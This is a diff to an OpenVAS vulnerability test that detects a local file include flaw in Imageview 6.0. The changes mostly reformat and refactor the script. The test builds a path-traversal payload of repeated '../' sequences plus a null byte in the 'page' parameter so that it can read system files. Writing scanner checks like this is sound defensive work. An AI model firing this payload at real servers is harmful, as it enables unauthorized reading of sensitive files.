@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_imageview_46599.nasl 5642 2017-03-21 08:49:30Z cfi $
+# $Id: gb_imageview_46599.nasl 5717 2017-03-24 13:02:24Z cfi $
 #
 # Imageview 'page' Parameter Local File Include Vulnerability
 #
@@ -33,24 +33,19 @@ may aid in further attacks.
 
 This issue affects Imageview 6.0; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103100);
- script_version("$Revision: 5642 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5717 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 14:02:24 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-03-01 13:10:12 +0100 (Tue, 01 Mar 2011)");
  script_bugtraq_id(46599);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
  script_name("Imageview 'page' Parameter Local File Include Vulnerability");
-
  script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46599");
  script_xref(name : "URL" , value : "http://www.blackdot.be/?inc=info");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if Imageview is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -62,29 +57,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-   
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+include("host_details.inc");
 
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/imageview6","/imageview",cgi_dirs());
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
 files = traversal_files();
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir,"/admin/index.php?page=unexisting",crap(data:"../",length:6*9),files[file],"%00"); 
+foreach dir( make_list_unique( "/imageview6", "/imageview", cgi_dirs( port:port ) ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+  if( dir == "/" ) dir = "";
 
+  foreach file( keys( files ) ) {
+
+    url = dir + "/admin/index.php?page=unexisting" + crap( data:"../", length:6 * 9 ) + files[file] + "%00";
+
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
+
+exit( 99 );
